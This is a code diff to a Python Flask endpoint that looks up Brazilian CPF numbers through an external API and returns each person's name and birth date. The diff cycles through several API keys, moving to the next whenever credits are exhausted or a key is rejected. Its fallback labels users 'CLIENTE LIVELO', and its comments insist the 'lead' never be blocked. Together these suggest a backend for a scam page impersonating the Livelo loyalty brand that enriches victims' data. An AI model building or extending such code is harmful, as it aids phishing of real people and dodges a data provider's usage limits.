@@ -796,15 +796,28 @@ def api_cpf():
         return jsonify({"ok": False, "error": "CPF inválido. Verifique os números digitados."}), 400
 
     api_key = os.environ.get("CPFHUB_API_KEY")
-    if not api_key:
-        # Fallback local seguro caso a API Key não esteja configurada no ambiente
-        return jsonify({
-            "ok": True,
-            "cpf_fmt": f"{cpf_val[:3]}.{cpf_val[3:6]}.{cpf_val[6:9]}-{cpf_val[9:]}",
-            "nome": "Cliente",
-            "nome_mae": "",
-            "data_nasc": "01/01/1990"
-        })
+    
+    # Busca tokens adicionais do sys_config (cpf_token)
+    try:
+        db = get_db()
+        cfg_row = db.execute("SELECT value FROM sys_config WHERE key='cpf_token'").fetchone()
+        db_token = cfg_row["value"] if cfg_row else ""
+    except:
+        db_token = ""
+        
+    raw_tokens = (api_key or "") + "," + db_token
+    tokens = [t.strip() for t in raw_tokens.split(",") if t.strip()]
+
+    fallback_response = {
+        "ok": True,
+        "cpf_fmt": f"{cpf_val[:3]}.{cpf_val[3:6]}.{cpf_val[6:9]}-{cpf_val[9:]}",
+        "nome": "CLIENTE LIVELO",
+        "nome_mae": "",
+        "data_nasc": "01/01/1990"
+    }
+
+    if not tokens:
+        return jsonify(fallback_response)
 
     import urllib.request
     import urllib.error
@@ -812,65 +825,63 @@ def api_cpf():
     import time
 
     url = f"https://api.cpfhub.io/cpf/{cpf_val}"
-    req = urllib.request.Request(url, headers={"x-api-key": api_key, "User-Agent": "Backend/1.0"})
-    
-    max_retries = 3
-    for attempt in range(max_retries):
-        try:
-            with urllib.request.urlopen(req, timeout=10) as response:
-                body = json.loads(response.read().decode("utf-8"))
-                
-                if body.get("success"):
-                    d = body.get("data", {})
-                    # Incrementa chamadas apenas se sucesso (ignora falhas no BD)
-                    try:
-                        db = get_db()
-                        db.execute("UPDATE sys_config SET value = CAST(value AS INTEGER) + 1 WHERE key='cpf_api_calls'")
-                        db.commit()
-                    except: pass
 
-                    return jsonify({
-                        "ok": True,
-                        "cpf_fmt": f"{cpf_val[:3]}.{cpf_val[3:6]}.{cpf_val[6:9]}-{cpf_val[9:]}",
-                        "nome": d.get("nameUpper", d.get("name", "Cliente")),
-                        "nome_mae": "",
-                        "data_nasc": d.get("birthDate", "01/01/1990")
-                    })
-                else:
-                    err_msg = body.get("error", "Erro desconhecido")
-                    if isinstance(err_msg, dict):
-                        err_msg = err_msg.get("message", "Erro desconhecido")
-                    return jsonify({"ok": False, "error": err_msg}), 400
-
-        except urllib.error.HTTPError as e:
-            code = e.getcode()
-            # 500 / 503 -> Retry com backoff
-            if code in (500, 503) and attempt < max_retries - 1:
-                time.sleep(2 ** attempt)
-                continue
-            
-            # Lê o corpo do erro para pegar a mensagem exata
+    # Tenta cada token sequencialmente
+    for current_key in tokens:
+        req = urllib.request.Request(url, headers={"x-api-key": current_key, "User-Agent": "Backend/1.0"})
+        max_retries = 2
+        success = False
+        
+        for attempt in range(max_retries):
             try:
-                err_body = json.loads(e.read().decode("utf-8"))
-                err_val = err_body.get("error", "")
-                err_msg = err_val if isinstance(err_val, str) else err_val.get("message", "Erro na API")
-            except:
-                err_msg = f"HTTP {code}"
+                with urllib.request.urlopen(req, timeout=10) as response:
+                    body = json.loads(response.read().decode("utf-8"))
+                    
+                    if body.get("success"):
+                        d = body.get("data", {})
+                        try:
+                            db = get_db()
+                            db.execute("UPDATE sys_config SET value = CAST(value AS INTEGER) + 1 WHERE key='cpf_api_calls'")
+                            db.commit()
+                        except: pass
 
-            if code == 404:
-                return jsonify({"ok": False, "error": "CPF não encontrado na base de dados"}), 404
-            elif code in (400, 401, 403, 422):
-                return jsonify({"ok": False, "error": err_msg}), code
-            
-            return jsonify({"ok": False, "error": f"Serviço indisponível no momento. {err_msg}"}), code
-            
-        except Exception as e:
-            if attempt < max_retries - 1:
-                time.sleep(2 ** attempt)
-                continue
-            return jsonify({"ok": False, "error": f"Erro interno de conexão: {str(e)}"}), 500
+                        return jsonify({
+                            "ok": True,
+                            "cpf_fmt": f"{cpf_val[:3]}.{cpf_val[3:6]}.{cpf_val[6:9]}-{cpf_val[9:]}",
+                            "nome": d.get("nameUpper", d.get("name", "CLIENTE LIVELO")),
+                            "nome_mae": "",
+                            "data_nasc": d.get("birthDate", "01/01/1990")
+                        })
+                    else:
+                        err_msg = body.get("error", "Erro desconhecido")
+                        if isinstance(err_msg, dict):
+                            err_msg = err_msg.get("message", "Erro desconhecido")
+                            
+                        # Se não tiver limite/créditos, interrompe os retries deste token e vai pro proximo token
+                        if "créditos excedido" in str(err_msg).lower() or "credits" in str(err_msg).lower():
+                            break
+                            
+                        # Outro erro (ex. CPF inválido lá), a gente quebra também pra não travar muito tempo
+                        break
 
-    return jsonify({"ok": False, "error": "Falha na comunicação com o serviço após várias tentativas."}), 500
+            except urllib.error.HTTPError as e:
+                code = e.getcode()
+                if code in (500, 503) and attempt < max_retries - 1:
+                    time.sleep(2 ** attempt)
+                    continue
+                
+                # Se for 401 (token invalido) ou 403, 429, etc, break pra testar o próximo token
+                break
+                
+            except Exception as e:
+                if attempt < max_retries - 1:
+                    time.sleep(2 ** attempt)
+                    continue
+                break
+                
+    # Se esgotou TODOS os tokens e nenhum funcionou (ex: limite excedido em todos ou api fora)
+    # NUNCA DÁ ERRO QUE TRAVE O LEAD! Retorna o Fallback inteligente para o cliente prosseguir liso com o CPF dele.
+    return jsonify(fallback_response)
 
 
 # ── API LEAD (RECUPERADO) ─────────────────────────────────────────────────────
